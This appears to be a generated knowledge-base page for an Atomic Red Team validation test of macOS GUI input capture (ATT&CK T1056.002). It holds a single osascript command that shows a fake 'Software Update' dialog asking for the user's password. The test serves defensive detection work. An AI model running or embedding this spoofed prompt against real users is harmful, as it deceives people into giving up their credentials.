---
atomic_guid: "76628574-0bc1-4646-8fe2-8f4427b47d15"
title: "AppleScript - Prompt User for Password"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.002"
attack_technique_name: "Input Capture: GUI Input Capture"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "bash"
aliases:
  - "76628574-0bc1-4646-8fe2-8f4427b47d15"
  - "AppleScript - Prompt User for Password"
platforms:
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# AppleScript - Prompt User for Password

Prompt User for Password (Local Phishing)
Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html

## Metadata

- Atomic GUID: 76628574-0bc1-4646-8fe2-8f4427b47d15
- Technique: T1056.002: Input Capture: GUI Input Capture
- Platforms: macos
- Executor: bash
- Source Path: atomics/T1056.002/T1056.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture|T1056.002]]

## Executor

- name: bash

### Command

```bash
osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml)
